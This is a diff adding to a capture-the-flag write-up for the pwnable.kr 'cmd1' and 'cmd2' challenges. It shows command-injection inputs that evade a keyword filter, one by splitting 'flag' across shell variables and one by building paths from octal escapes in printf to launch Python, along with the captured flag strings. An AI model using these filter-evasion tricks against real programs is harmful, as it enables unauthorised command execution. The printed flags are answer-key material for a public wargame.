@@ -323,7 +323,7 @@ sorry mom... I FORGOT to check duplicate numbers... :(
 sorry mom... I FORGOT to check duplicate numbers... :(
 
 
-# cmd1
+## cmd1
 We need to insert code that will print flag aand will not contain 'flag', 'sh' or 'tmp':
 ```shell
 cmd1@pwnable:~$ ./cmd1 'a='fl' && b='ag' && /bin/cat "${a}${b}"'
@@ -331,3 +331,17 @@ mommy now I get what PATH environment is for :)
 ```
 #### Flag
 mommy now I get what PATH environment is for :)
+
+## cmd2
+Same as cmd1, more filter, use printf(with octa character) to start python
+```shell
+pwnable% ./cmd2 '$(printf \\057usr\\057bin\\057python)'
+$(printf \\057usr\\057bin\\057python)
+Python 2.7.12 (default, Mar  1 2021, 11:38:31)
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> open('flag', 'r').read()
+'FuN_w1th_5h3ll_v4riabl3s_haha\n'
+```
+#### Flag
+FuN_w1th_5h3ll_v4riabl3s_haha
